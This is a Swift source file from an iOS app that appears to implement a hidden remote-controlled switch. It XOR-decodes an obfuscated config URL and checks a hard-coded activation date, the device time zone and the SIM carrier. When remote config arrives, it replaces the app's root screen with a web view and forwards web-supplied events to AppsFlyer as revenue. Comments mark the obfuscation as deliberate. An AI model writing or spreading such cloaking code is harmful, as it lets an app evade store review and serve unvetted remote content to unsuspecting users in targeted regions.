
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Boxuyxs(_ input: String) -> String? {
    let k: UInt8 = 233
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    let dhys = String(bytes: decryptedBytes, encoding: .utf8)?.reversed()
    return String(dhys!)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
//internal let kNaeuuae = "wd3d2dqThobI2cCHxNCEwNmHwMaG35uGwNmHw9rGxw=="         //Ip ur

//
//internal let kCisyous = "29nZjIqLjdvRjI3cjNvUjYC2nZqGmYCZiNbG2dnZiIrZ3YiIitHcjNvfxoKKhoTGnYyHx52ahpmAmYjHgoqGhMbG05qZnZ2B"


//https://mock.apipost.net/mock/62e58caa40ca000/?apipost_id=2e5de82dbce002
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kIzbxey = "29nZjIqLjdvRjI3cjNvUjYC2nZqGmYCZiNbG2dnZiIrZ3YiIitHcjNvfxoKKhoTGnYyHx52ahpmAmYjHgoqGhMbG05qZnZ2B"

// https://raw.githubusercontent.com/jduja/crazygold/main/bomb_normal.png
// uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg==
//internal let kBuazxous = "uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func misouche() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! PrismTabContainerViewController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 66 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Fzuxbeyx() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: misouche
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Lozxubex(_ dt: Fznauts) {
    DispatchQueue.main.async {
        UserDefaults.standard.setModel(dt, forKey: "Fznauts")
        UserDefaults.standard.synchronize()
        
        let vc = KzoiutzFrztaCV()
        vc.hzidin = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Dfatzxxi(_ param: Fznauts) {
    let fName = ""

    typealias rushBlitzIusj = (Fznauts) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Lozxubex
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func Bzytxte(_ dic: String) {
    let dataDic = dic.stringTo()
    
    let name = dataDic![EvKy] as! String
//    print(name)
    
    let data = dataDic![EvVue] as? [String : Any]
    if let vat = data!["value"] {
        AppsFlyerLib.shared().logEvent(name: name, values: [AFEventParamRevenue : vat, AFEventParamCurrency: MUnt]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name, withValues: dataDic)
    }
}

internal func Fszixyyhs(_ param: String) {
    let fName = ""
    typealias maxoPams = (String) -> Void
    let fctn: [String: maxoPams] = [
        fName : Bzytxte
    ]
    
    fctn[fName]?(param)
}

//internal struct Ybasie: Codable {
//
//    let country: Kmaoin?
//    
//    struct Kmaoin: Codable {
//        let code: String
//    }
//
//}

internal struct Fznauts: Codable {
    
    let cvaosu: String?         //key arr
    let hdsyxs: [String]?            // yeu nan xianzhi
    let kdoix: String?         // shi fou kaiqi
    let vsuyzy: String?         // jum
    let cbuays: String?          // backcolor
    let nxbsao: String?
    let wao9iz: String?   //ad key
    let cmouex: String?   // app id
}

func mdnaou() -> Bool {
   
  // 2026-05-03 16:32:51
  //1777797171
    let ftTM = 1777797171
    let ct = Date().timeIntervalSince1970
    if Int(ct) - ftTM > 0 {
        return true
    }
    return false
}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [Boxuyxs("3tg="), Boxuyxs("xcc=")]

// 时区控制
func foznehs() -> Bool {
    
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if cdo.contains(rc) {
//            return false
//        }
//    }
    
    if !cbhahus() {
        return false
    }
    
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > 6 && offset <= 8) || (offset > -11 && offset < -2) {
        return true
    }
    
    return false
}

import CoreTelephony

func cbhahus() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
